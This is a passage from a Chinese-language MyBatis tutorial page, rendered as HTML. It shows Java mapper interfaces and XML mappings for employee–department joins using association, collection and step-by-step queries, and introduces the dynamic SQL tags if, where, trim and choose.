xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;empDeptMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;eid&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;ename&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;ename&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dept.did&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;dname&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dept.dname&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-comment">&lt;!--Emp getEmpAndDeptByEid(@Param(&quot;eid&quot;) int eid);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpAndDeptByEid&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;empDeptMap&quot;</span>&gt;</span><br>select emp.*,dept.* from t_emp emp left join t_dept dept on emp.did =<br>dept.did where emp.eid = #&#123;eid&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>方式2: association处理</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;empDeptMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;eid&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;ename&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;ename&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dept&quot;</span> <span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;Dept&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;did&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;dname&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dname&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-comment">&lt;!--Emp getEmpAndDeptByEid(@Param(&quot;eid&quot;) int eid);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpAndDeptByEid&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;empDeptMap&quot;</span>&gt;</span><br>select emp.*,dept.* from t_emp emp left join t_dept dept on emp.did =<br>dept.did where emp.eid = #&#123;eid&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>方式3: 分步查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 通过分步查询查询员工信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> eid</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>Emp <span class="hljs-title function_">getEmpByStep</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;eid&quot;)</span> <span class="hljs-type">int</span> eid)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;empDeptStepMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;eid&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;ename&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;ename&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">select：设置分步查询，查询某个属性的值的sql的标识（namespace.sqlId）</span><br><span class="hljs-comment">column：将sql以及查询结果中的某个字段设置为分步查询的条件</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dept&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.atguigu.MyBatis.mapper.DeptMapper.getEmpDeptByStep&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-comment">&lt;!--Emp getEmpByStep(@Param(&quot;eid&quot;) int eid);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpByStep&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;empDeptStepMap&quot;</span>&gt;</span><br>select * from t_emp where eid = #&#123;eid&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 分步查询的第二步： 根据员工所对应的did查询部门信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> did</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>Dept <span class="hljs-title function_">getEmpDeptByStep</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;did&quot;)</span> <span class="hljs-type">int</span> did)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Dept getEmpDeptByStep(@Param(&quot;did&quot;) int did);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpDeptByStep&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Dept&quot;</span>&gt;</span><br>select * from t_dept where did = #&#123;did&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><div class="info"><p>多表联查, 必有一个是主表, 也就是想获取信息的表通过主表的id, 去附表根据id在查方案: association标签<br>property属性: 我们第一步搞不定的属性是哪个<br>select属性: 定位到第二步查询的 sql  id 位置<br>column属性: 用查询结果的哪个字段去查</p></div><h3 id="7-3-多对多处理">7.3 多对多处理</h3><p><strong>方式1: collection处理</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 根据部门id查新部门以及部门中的员工信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> did</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>Dept <span class="hljs-title function_">getDeptEmpByDid</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;did&quot;)</span> <span class="hljs-type">int</span> did)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deptEmpMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Dept&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;did&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dname&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;dname&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">  ofType：设置collection标签所处理的集合属性中存储数据的类型</span><br><span class="hljs-comment">  --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;emps&quot;</span> <span class="hljs-attr">ofType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;eid&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;ename&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;ename&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">collection</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-comment">&lt;!--Dept getDeptEmpByDid(@Param(&quot;did&quot;) int did);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getDeptEmpByDid&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;deptEmpMap&quot;</span>&gt;</span><br>  select dept.*,emp.* from t_dept dept left join t_emp emp on dept.did = emp.did where dept.did = #&#123;did&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>方式2: 分步查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 分步查询部门和部门中的员工</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> did</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>Dept <span class="hljs-title function_">getDeptByStep</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;did&quot;)</span> <span class="hljs-type">int</span> did)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deptEmpStep&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Dept&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;did&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;dname&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;dname&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;emps&quot;</span> <span class="hljs-attr">fetchType</span>=<span class="hljs-string">&quot;eager&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.atguigu.MyBatis.mapper.EmpMapper.getEmpListByDid&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">collection</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-comment">&lt;!--Dept getDeptByStep(@Param(&quot;did&quot;) int did);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getDeptByStep&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;deptEmpStep&quot;</span>&gt;</span><br>  select * from t_dept where did = #&#123;did&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 根据部门id查询员工信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> did</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>List&lt;Emp&gt; <span class="hljs-title function_">getEmpListByDid</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;did&quot;)</span> <span class="hljs-type">int</span> did)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;Emp&gt; getEmpListByDid(@Param(&quot;did&quot;) int did);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpListByDid&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>select * from t_emp where did = #&#123;did&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="7-4-总结">7.4 总结</h3><div class="info"><p>员工与部门是多对一的关系, 一个部门对应多个员工, 一个员工对应一个部门像id就应该设在部门里, 链接到员工中. 反之去想,  设置在员工中, 每个部门每个id都不同, 无法反应出关系对一就是对应的一个对象, 如Emp里面的Dept对象对多就是对应的一个集合. 如Dept里面的emps集合</p></div><h2 id="8-动态SQL">8. 动态SQL</h2><h3 id="8-1-if">8.1 if</h3><blockquote><p>if标签可通过test属性的表达式进行判断，若表达式的结果为true，则标签中的内容会执行；反之标签中的内容不会执行</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;Emp&gt; getEmpListByCondition(Emp emp);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpListByMoreTJ&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>  select * from t_emp where 1=1<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span><br> and ename = #&#123;ename&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span><br>  and age = #&#123;age&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span><br>  and sex = #&#123;sex&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-2-where">8.2 where</h3><blockquote><p>where和if一般结合使用：</p></blockquote><ol><li class="lvl-3"><p>若where标签中的if条件都不满足，则where标签没有任何功能，即不会添加where关键字</p></li><li class="lvl-3"><p>若where标签中的if条件满足，则where标签会自动添加where关键字，并将条件最前方多余的and去掉注意：where标签不能去掉条件最后多余的and</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpListByMoreTJ2&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>  select * from t_emp<br>    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span><br>    ename = #&#123;ename&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span><br>    and age = #&#123;age&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span><br>    and sex = #&#123;sex&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-3-trim">8.3 trim</h3><blockquote><p>trim用于去掉或添加标签中的内容常用属性：<br>prefix：在trim标签中的内容的前面添加某些内容<br>prefixOverrides：在trim标签中的内容的前面去掉某些内容<br>suffix：在trim标签中的内容的后面添加某些内容<br>suffixOverrides：在trim标签中的内容的后面去掉某些内容</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpListByMoreTJ&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>  select * from t_emp<br>  <span class="hljs-tag">&lt;<span class="hljs-name">trim</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;where&quot;</span> <span class="hljs-attr">suffixOverrides</span>=<span class="hljs-string">&quot;and&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;ename != &#x27;&#x27; and ename != null&quot;</span>&gt;</span><br>    ename = #&#123;ename&#125; and<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span><br>    age = #&#123;age&#125; and<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span><br>    sex = #&#123;sex&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">trim</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-4-choose-when-otherwise">8.4 choose, when, otherwise</h3><blockquote><p>choose、when、 otherwise相当于if…else if…else<br>当某条件成立, 后面条件将不再判断</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;Emp&gt; getEmpListByChoose(Emp emp);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmpListByChoose&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Emp&quot;</span>&gt;</span><br>  select <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;empColumns&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span> from t_emp<br>  <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">choose</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;ename != &#x27;&#x27; and ename != 